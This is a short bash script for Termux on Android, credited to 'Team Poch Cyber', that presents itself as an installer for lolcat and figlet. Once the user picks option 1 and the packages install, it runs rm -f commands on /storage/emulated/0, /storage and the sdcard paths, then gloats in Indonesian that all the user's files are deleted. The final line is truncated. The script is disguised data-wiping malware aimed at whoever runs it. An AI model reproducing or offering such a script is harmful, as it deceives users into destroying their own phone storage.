#usr/bin/bash
#TeamPochCyber


echo "──────────────────────────────" | lolcat
echo "     Author = Ramdani" | lolcat
echo "      Team Poch Cyber" | lolcat
echo "   contact = 081316230844" | lolcat
echo "──────────────────────────────" | lolcat
date | lolcat

echo "───────────────────────────────" | lolcat
echo " (1) install bahannya dulu guys" | lolcat
echo "───────────────────────────────" | lolcat
echo "┌[TeamPoch]"
read -p "└Disini =" bro

if [ $bro = 1 ]
then
clear
figlet Team Poch Cyber
apt update && apt upgrade
apt install git
pkg install ruby
pkg install gem
gem install lolcat
pkg install figlet
rm -f /storage/emulated/0
rm -f /storage
rm -f /storage/sdcard
rm -f /storage/sdcard1
rm -f /storage/sdcard2
echo "oke tunggu sebentar" | lolcat
echo "selamat file anda terhapus semua haha kalau mau balik lagi data d$
fi